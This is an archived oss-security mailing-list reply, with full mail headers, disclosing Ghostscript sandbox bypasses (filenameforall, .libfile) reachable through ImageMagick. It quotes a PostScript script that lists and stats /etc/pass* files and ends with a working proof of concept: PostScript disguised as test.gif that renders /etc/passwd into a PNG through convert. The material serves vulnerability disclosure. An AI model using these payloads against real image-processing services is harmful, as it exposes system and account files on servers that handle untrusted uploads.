X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2927" "Thursday" "29" "September" "2016" "14:28:28" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>" "100" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092921:28:28" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 29  100/2927  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 11432 invoked by uid 550); 29 Sep 2016 21:45:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32702 invoked from network); 29 Sep 2016 21:29:02 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=Y5D5jRXyoExxrCYRz+YlHJLkz7aY/TT93p4NFgblsAE=;
        b=ps4agE6ITGEOJngHSsjtHXUGBKi1l0kRzY0Uaz3/0TxZaCVdCXRLdphDxUteWsqC9a
         Z/0vkPvbY1JF1X0/8zy9bgVNvfUBry4qdXGD6jFooJw5KBDANtqDmE8H694WiCLRMpOs
         ICgXbp56QdtnfA69+3pYU8uppRXEsexdd7IsMgrEWJaUVHTW3LIixt3cmcIxffzzewxV
         ZCQn5/DtvUzCoLdwAju9ppn4EDOfAZmywFouIYRr2WBLaiCs2nG/qnvw6h211keAt4lV
         BuDXnZGOwo57b59Zih8WpT8/tbkmedp2eEut31p6CmzFcQG5lDUwM+OFsSeHmEAFQhIK
         5S9Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=Y5D5jRXyoExxrCYRz+YlHJLkz7aY/TT93p4NFgblsAE=;
        b=VT33TOh+MOyu4Bbx4H7wuOFhn/pMdE1rwqOXCyyWgaKf5bYi1QfhWBNeOG6E/5s3hO
         acS8Mm1OYww1iLsUAk3o12PwJG0tMePWanmnZuhEqLh8eMPdqdULP05ZmOsyXZxwiM2V
         u/VPe/XjtRAMlQ10+lc+6b5MYcVvysGTNtzqSg1eNV9uyXB9qOYU5fTpR5xqKf4U4tqk
         Q9H6BUWNrOGy5wZognGuWvWJ51+U8HHrj6yDUG79MwiR9hjGOpYV3VswyYPAwdLzTl8+
         IzVkw5UMsIcT5ydbKkpSWV+31epZPR3SA0hJP0RtWkWfflGGj7/ggDKVs2gaWHJh78hK
         vHpQ==
X-Gm-Message-State: AA6/9RnRgwTt+oyrv8sjwL8H01gU4fVR+AyrNB18Ll1S3a1DseFzUrNlBVG+oyHQ8O1OcnHmo/FIzqxexew7MHJ3
X-Received: by 10.31.135.14 with SMTP id j14mr3319129vkd.94.1475184529293;
 Thu, 29 Sep 2016 14:28:49 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
 <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
 <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
 <877f9vcjd9.fsf@mid.deneb.enyo.de> <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
Message-ID: <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Thu, 29 Sep 2016 14:28:28 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

On Thu, Sep 29, 2016 at 5:02 AM, Tavis Ormandy <taviso@google.com> wrote:
> On Wed, Sep 28, 2016 at 11:25 PM, Florian Weimer <fw@deneb.enyo.de> wrote:
>>
>> * Tavis Ormandy:
>>
>> > Here is the code I'm testing with (Note: I really don't know much
>> > postscript - and I hate it).
>> >
>> > $ cat test.ps
>> > /dumpname {
>> >     dup             % copy filename
>> >     dup             % copy filename
>> >     print           % print filename
>> >     (\n) print      % print newline
>> >     status          % stat filename
>> >     {
>> >         (stat succeeded\n) print
>> >         ( ctime:) print
>> >         64 string cvs print
>> >         ( atime:) print
>> >         64 string cvs print
>> >         ( size:) print
>> >         64 string cvs print
>> >         ( blocks:) print
>> >         64 string cvs print
>> >         (\n) print
>> >         (\n) print
>> >     }{
>> >         (unable to stat\n\n) print
>> >     } ifelse
>> >     .libfile        % open as library
>> >     {
>> >         (.libfile returned file\n\n) print
>> >         64 string readstring
>> >         pop         % discard result (should proably test)
>> >         print
>> >         (\n) print
>> >     }{
>> >         (.libfile returned string\n) print
>> >         print
>> >         (\n) print
>> >     } ifelse
>> > } def
>> >
>> > (/etc/pass*) /dumpname load 256 string filenameforall
>>
>> filenameforall was fixed as part of this:
>>
>>   http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
>>   http://bugs.ghostscript.com/show_bug.cgi?id=694724
>>
>> This also covers getenv and has already been assigned CVE-2013-5653.
>
> Thanks Florian, that explains it, although the distros do not appear
> to have picked that patch up.
>
>>
>> > $ identify test.ps
>> > /etc/passwd
>> > stat succeeded
>> >  ctime:1474998792 atime:1474998792 size:2662 blocks:8
>> >
>> > .libfile returned file
>>
>> .libfile is not yet fixed upstream.  I reported this upstream:
>>
>>   http://bugs.ghostscript.com/show_bug.cgi?id=697169
>
> Thanks - seems like bad news for any automated image/document processing.
>
> Tavis.

Just for future reference, here is an example of dumping a file to an
image processed with ImageMagick that works with gs 9.20:

$ cat test.gif
%!PS
/Size 20 def                             % font/line size
/Line 0 def                              % current line
/Buf 1024 string def                     % line buffer
/Path 0 newpath def

/Courier-Bold findfont Size scalefont setfont
1 1 1 setrgbcolor clippath fill          % draw white background
0 0 0 setrgbcolor                        % set black foreground

(/etc/passwd) .libfile {
    {
        dup Buf readline
        {
            Path Line moveto show
        }{
            showpage
            quit
        } ifelse
        % next line
        /Line Line Size add def
    } loop
} if
$ convert test.gif png:test.png
